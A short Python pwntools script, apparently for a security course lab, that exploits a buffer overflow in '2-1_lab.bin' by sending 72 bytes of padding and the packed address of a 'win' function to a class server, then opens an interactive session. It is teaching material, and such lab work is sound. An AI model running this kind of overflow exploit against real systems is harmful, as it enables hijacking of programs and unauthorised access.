from pwn import *

# Load ELF 
e = ELF("./2-1_lab.bin")

''' Obtain Symbol Address '''
target = e.symbols["win"]       # Get Symbol Address
target_packed=p64(target)       # Pack Address

''' Print Target Information '''
print(f' \n\nTarget Function win() is located at 0x{target}')
print(f'hex dump:\n{hexdump(target_packed)}')


''' Establish Connection to Server '''
#p = process("./2-1_lab.bin")            # Uncomment to Test Script Locally
p = remote("csc748.hostbin.org", 7021)      # Test Script Against Server

''' Exploit Vulnerability '''
p.sendline(b"A"*72 + target_packed)                   # Fill Buffer and Send Packed Target
p.interactive()                             # Start Interactive Session

